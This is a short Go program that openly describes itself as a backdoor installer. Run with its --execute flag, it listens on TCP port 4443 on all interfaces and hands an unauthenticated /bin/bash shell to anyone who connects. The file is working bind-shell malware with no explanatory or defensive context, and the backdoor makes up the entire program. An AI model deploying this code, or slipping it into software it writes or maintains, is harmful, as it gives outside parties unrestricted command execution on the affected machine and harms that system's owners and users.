package main

import (
	"flag"
	"fmt"
	"net"
	"os/exec"
)

func main() {
	execute := flag.Bool("execute", false, "Execute the backdoor installation")

	flag.Parse()

	if *execute {
		fmt.Println("Executing backdoor installation")
		installation()
	} else {
		fmt.Println("Use --execute flag to run the backdoor installation")
		flag.PrintDefaults()
	}
}

func installation() {
	// Listen on all interfaces on the specified port
	listener, err := net.Listen("tcp", "0.0.0.0:4443")
	if err != nil {
		fmt.Println("Error creating listener:", err)
		return
	}
	defer listener.Close()
	fmt.Println("Listening on 0.0.0.0:4443")

	// Accept connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	fmt.Println("Connection from", conn.RemoteAddr())

	// Execute /bin/bash
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err := cmd.Run()
	if err != nil {
		fmt.Println("Error running command:", err)
	}
}
